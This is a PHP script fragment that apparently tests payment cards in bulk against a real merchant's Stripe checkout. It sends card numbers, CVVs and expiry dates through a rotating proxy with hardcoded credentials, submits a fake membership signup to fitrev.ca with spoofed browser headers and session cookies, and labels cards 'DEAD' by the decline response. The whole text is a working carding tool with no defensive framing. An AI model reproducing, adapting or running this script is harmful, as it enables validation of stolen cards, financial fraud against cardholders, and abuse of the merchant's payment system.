...
# -------------------- [WEBSHARE PROXY] -------------------#
$webshareuser = 'hlxgnauv-rotate';
$websharepass = '40yqoksn2oxo';
$webshareport = 80;
...
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/api6/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/api6/cookie.txt');

# ----------------- [1REQ POSTFIELDS] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=92d31251-18b8-45ef-8984-46772e839e9f4d7ad4&muid=ef168401-c423-4deb-b37e-b1de726dd7b0883a7d&sid=22ecd942-d671-4b46-9005-211d7d09a9f9ac2cbc&payment_user_agent=stripe.js%2F0663df7b8%3B+stripe-js-v3%2F0663df7b8&time_on_page=34662&key=pk_live_v8aOZ2KgPlmD3kZYo1V3vIBF00P95y6jmA');
...
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$webshareuser:$websharepass");
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://fitrev.ca/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
...
'content-type: application/x-www-form-urlencoded' ,
'cookie: PHPSESSID=f394028af905696e785ed3cad10eaf55; pmpro_visit=1; __stripe_mid=ef168401-c423-4deb-b37e-b1de726dd7b0883a7d; __stripe_sid=22ecd942-d671-4b46-9005-211d7d09a9f9ac2cbc' ,
'origin: https://fitrev.ca' ,
'referer: https://fitrev.ca/membership-account/membership-checkout/' ,
'sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"' ,
'sec-ch-ua-mobile: ?1' ,
'sec-ch-ua-platform: "Android"' ,
...
curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&username='.$firstname.''.$lastname.'&password='.$email.'&password2='.$email.'&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&CardType=visa&tos=1&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX6032&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');
...
(strpos($result2,  "do_not_honor")) {
  echo "┠ Status ⇝ DEAD ✘  Resp ⇝ Resp ⇝ DO NOT HONOR! 🞬";
}
